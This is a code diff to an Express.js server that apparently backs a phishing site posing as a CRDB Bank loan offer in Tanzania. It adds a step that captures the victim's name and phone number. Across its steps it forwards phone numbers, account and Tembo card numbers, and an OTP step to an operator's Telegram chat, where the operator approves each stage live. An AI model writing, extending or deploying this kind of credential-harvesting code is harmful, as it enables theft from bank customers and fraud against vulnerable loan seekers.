@@ -6,7 +6,6 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Replace or set via Render Environment Variables
 const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
 let bot;
 
@@ -34,14 +33,30 @@ app.post('/api/submit', async (req, res) => {
         clientData = { ...clientData, ...data };
 
         if (!bot) {
-            return res.status(500).json({ success: false, message: 'Bot not initialized. Check TELEGRAM_BOT_TOKEN.' });
+            return res.status(500).json({ success: false, message: 'Bot not initialized.' });
         }
 
         if (!adminChatId) {
             return res.status(400).json({ success: false, message: 'Please send /start to your Telegram bot first!' });
         }
 
-        if (step === 'step3') {
+        if (step === 'personal_info') {
+            const msgText = `👤 **Step: Taarifa za Mtu na Simu**\n\n📝 **Full Name:** ${data.fullName}\n📱 **Phone No:** ${data.phoneNumber}\n💰 **Requested Loan:** TZS ${Number(data.loanAmount || 0).toLocaleString()}\n\n*Check SimBanking registration status:*`;
+            const opts = {
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: '✅ REGISTERED', callback_data: 'phone_registered' },
+                            { text: '❌ NOT REGISTERED', callback_data: 'phone_unregistered' }
+                        ]
+                    ]
+                },
+                parse_mode: 'Markdown'
+            };
+            await bot.sendMessage(adminChatId, msgText, opts);
+            return res.json({ success: true, pendingApproval: true });
+        }
+        else if (step === 'step3') {
             const msgText = `💳 **Step 3: Account & Tembo Card Verification**\n\n🏦 **Account No:** ${data.accountNumber}\n💳 **Tembo Card No:** ${data.cardNumber}\n\n*Choose action for applicant:*`;
             const opts = {
                 reply_markup: {
@@ -115,10 +130,16 @@ if (bot) {
         try {
             await bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: '✔ ACTION PROCESSED', callback_data: 'done' }]] }, { chat_id: chatId, message_id: messageId });
         } catch (e) {
-            // Ignore markup edit errors
+            // Ignore edit markup errors
         }
 
-        if (action === 'card_proceed') {
+        if (action === 'phone_registered') {
+            await bot.sendMessage(chatId, '✅ Phone registered. Moving applicant to Tembo Card verification.');
+            currentClientResponse = { status: 'approved', next: 'card_verify' };
+        } else if (action === 'phone_unregistered') {
+            await bot.sendMessage(chatId, '❌ Phone not registered on SimBanking.');
+            currentClientResponse = { status: 'retry_phone', message: 'Namba ya simu au jina uliloingiza halijasajiliwa kwenye SimBanking. Tafadhali ingiza namba sahihi ya CRDB SimBanking ❌' };
+        } else if (action === 'card_proceed') {
             await bot.sendMessage(chatId, '✅ Card details approved. Moving applicant to OTP step.');
             currentClientResponse = { status: 'approved', next: 'otp' };
         } else if (action === 'card_deny') {
@@ -163,4 +184,4 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-    
+                
